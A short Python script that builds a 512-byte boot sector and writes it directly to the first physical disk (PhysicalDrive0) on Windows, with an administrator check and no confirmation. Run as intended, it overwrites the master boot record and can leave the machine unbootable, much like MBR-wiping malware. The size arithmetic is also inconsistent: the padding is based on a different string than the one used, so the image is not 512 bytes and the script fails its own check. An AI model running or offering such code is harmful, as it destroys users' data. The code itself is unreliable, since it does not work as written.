import os
import ctypes

def create_bootloader_file(file_path):
    bootloader = (
        b"\xEB\x3C\x90"
        b"Hello, Bootloader!\x00"
        + b"\x00" * (510 - len("Hello, World!") - 3)
        + b"\x55\xAA"
    )

    if len(bootloader) != 512:
        raise ValueError

    with open(file_path, "wb") as f:
        f.write(bootloader)


def write_bootloader_to_disk(disk_path, bootloader_path):
    with open(bootloader_path, "rb") as f:
        bootloader_bytes = f.read()

    if len(bootloader_bytes) != 512:
        raise ValueError

    with open(disk_path, "r+b") as disk:
        disk.write(bootloader_bytes)


if __name__ == "__main__":
    bootloader_file = "bootloader.bin"
    disk_path = r"\\.\PhysicalDrive0"
    
    if os.name == "nt":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            raise PermissionError

    create_bootloader_file(bootloader_file)
    write_bootloader_to_disk(disk_path, bootloader_file)
